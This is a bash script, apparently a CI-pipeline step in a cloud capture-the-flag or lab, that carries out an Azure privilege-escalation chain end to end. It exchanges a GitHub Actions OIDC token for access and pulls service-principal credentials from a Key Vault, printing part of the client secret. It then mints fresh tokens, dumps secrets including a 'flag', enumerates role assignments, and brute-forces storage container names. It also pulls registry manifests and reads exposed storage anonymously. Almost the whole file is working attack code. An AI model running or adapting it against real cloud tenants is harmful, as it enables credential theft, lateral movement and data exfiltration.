#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE="https://management.azure.com"

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none

echo "=== READ sync-service-principal ==="
SYNCRAW=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name sync-service-principal 2>/dev/null)
SYNC_CID=$(echo "$SYNCRAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d.get("value","{}"));print(v.get("appId",""))' 2>/dev/null)
SYNC_SEC=$(echo "$SYNCRAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d.get("value","{}"));print(v.get("clientSecret",""))' 2>/dev/null)
echo "sync-service appId: $SYNC_CID"
echo "sync-service clientSecret: ${SYNC_SEC:0:20}..."

echo ""
echo "=== GET sync-service TOKENS ==="
# ARM token
SYNC_AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$SYNC_CID" --data-urlencode "client_secret=$SYNC_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://management.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "sync-service ARM token len=${#SYNC_AT}"

# Vault token
SYNC_VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$SYNC_CID" --data-urlencode "client_secret=$SYNC_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://vault.azure.net/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "sync-service vault token len=${#SYNC_VT}"

# Storage token
SYNC_ST=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$SYNC_CID" --data-urlencode "client_secret=$SYNC_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://storage.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "sync-service storage token len=${#SYNC_ST}"

# Get OID from ARM token
if [ "${#SYNC_AT}" -gt 100 ]; then
  SYNC_OID=$(python3 -c "
import sys,json,base64
t='$SYNC_AT'.split('.')[1]; t+='='*((-len(t))%4)
print(json.loads(base64.urlsafe_b64decode(t)).get('oid',''))
" 2>/dev/null)
  echo "sync-service OID: $SYNC_OID"
fi

echo ""
echo "=== sync-service ON KV SEC ==="
if [ "${#SYNC_VT}" -gt 100 ]; then
  echo "--- secrets list ---"
  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    -H "Authorization: Bearer $SYNC_VT"
  echo ""
  echo "--- flag secret ---"
  curl -sS "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4" \
    -H "Authorization: Bearer $SYNC_VT"
  echo ""
  echo "--- kv-tbl-prod-x3euoz list (access policy) ---"
  curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    -H "Authorization: Bearer $SYNC_VT"
fi

echo ""
echo "=== sync-service ARM - ROLE ASSIGNMENTS ==="
if [ "${#SYNC_AT}" -gt 100 ]; then
  echo "--- sub-level role assignments for sync-service ---"
  curl -sS "$ARM_BASE/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId+eq+'$SYNC_OID'" \
    -H "Authorization: Bearer $SYNC_AT" | python3 -c '
import sys,json
d=json.load(sys.stdin)
vals=d.get("value",[])
err=d.get("error",{})
if err: print("ERR:", err.get("code",""), err.get("message","")[:200])
else:
    print("Total assignments:", len(vals))
    for r in vals:
        role=r["properties"]["roleDefinitionId"].split("/")[-1]
        scope=r["properties"]["scope"]
        print(f"  role={role[:8]} scope={scope[:100]}")
' 2>/dev/null
fi

echo ""
echo "=== secrets-sync CI LOGS DIRECT CONTAINER ACCESS ==="
SS_CID=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name secrets-sync-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
SS_SEC=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name secrets-sync-principal 2>/dev/null \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)

SS_ST=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode "client_id=$SS_CID" --data-urlencode "client_secret=$SS_SEC" \
  --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=https://storage.azure.com/.default" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "SS storage token len=${#SS_ST}"

if [ "${#SS_ST}" -gt 100 ]; then
  echo "--- Direct list blobs in 'logs' container ---"
  BLIST=$(curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/logs?restype=container&comp=list" \
    -H "Authorization: Bearer $SS_ST" -H "x-ms-version: 2021-08-06")
  echo "$BLIST" | head -c 3000

  echo ""
  echo "--- Try other common container names ---"
  for cn in builds ci-logs github-actions actions artifacts; do
    S=$(curl -sS -o /dev/null -w '%{http_code}' \
      "https://sttblcilogsprodx3euoz.blob.core.windows.net/$cn?restype=container&comp=list" \
      -H "Authorization: Bearer $SS_ST" -H "x-ms-version: 2021-08-06")
    echo "  container '$cn': $S"
  done

  echo ""
  echo "--- Try with sync-service token (if different) ---"
  if [ "${#SYNC_ST}" -gt 100 ]; then
    echo "sync-service on CI logs:"
    curl -sS "https://sttblcilogsprodx3euoz.blob.core.windows.net/?comp=list" \
      -H "Authorization: Bearer $SYNC_ST" -H "x-ms-version: 2021-08-06" | head -c 1000
    echo ""
    echo "sync-service on appcfg:"
    curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/?comp=list" \
      -H "Authorization: Bearer $SYNC_ST" -H "x-ms-version: 2021-08-06" | head -c 1000
    echo ""
    echo "sync-service on backup:"
    curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/?comp=list" \
      -H "Authorization: Bearer $SYNC_ST" -H "x-ms-version: 2021-08-06" | head -c 1000
  fi
fi

echo ""
echo "=== ACR LOGIN AND CATALOG-API ==="
# Try ACR with cicd-deployer OIDC token
ARM=$(az account get-access-token --resource https://management.azure.com --query accessToken -o tsv)
ACR_TOKEN=$(curl -sS "https://crtblplatprodx3euoz.azurecr.io/oauth2/exchange" \
  -X POST --data-urlencode "grant_type=access_token" \
  --data-urlencode "service=crtblplatprodx3euoz.azurecr.io" \
  --data-urlencode "access_token=$ARM" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("refresh_token",""))' 2>/dev/null)
echo "ACR refresh token len=${#ACR_TOKEN}"

if [ "${#ACR_TOKEN}" -gt 100 ]; then
  # Get catalog-api repo tags
  ACR_SCOPE="repository:catalog-api:pull"
  ACR_ACCESS=$(curl -sS "https://crtblplatprodx3euoz.azurecr.io/oauth2/token?service=crtblplatprodx3euoz.azurecr.io&scope=repository:catalog-api:pull" \
    -X POST --data-urlencode "grant_type=refresh_token" \
    --data-urlencode "refresh_token=$ACR_TOKEN" \
    | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
  echo "catalog-api access token len=${#ACR_ACCESS}"

  if [ "${#ACR_ACCESS}" -gt 100 ]; then
    echo "--- catalog-api tags ---"
    curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/catalog-api/tags/list" \
      -H "Authorization: Bearer $ACR_ACCESS"
    echo ""
    echo "--- catalog-api manifest ---"
    curl -sS "https://crtblplatprodx3euoz.azurecr.io/v2/catalog-api/manifests/latest" \
      -H "Authorization: Bearer $ACR_ACCESS" | head -c 3000
  fi
fi

echo ""
echo "=== APPCFG STORAGE - internal-config.json ANONYMOUS ==="
curl -sS "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" | head -c 2000

echo ""
echo "=== BACKUP STORAGE - PUBLIC EXPORTS ==="
curl -sS "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" | head -c 3000

echo ""
echo "DONE"
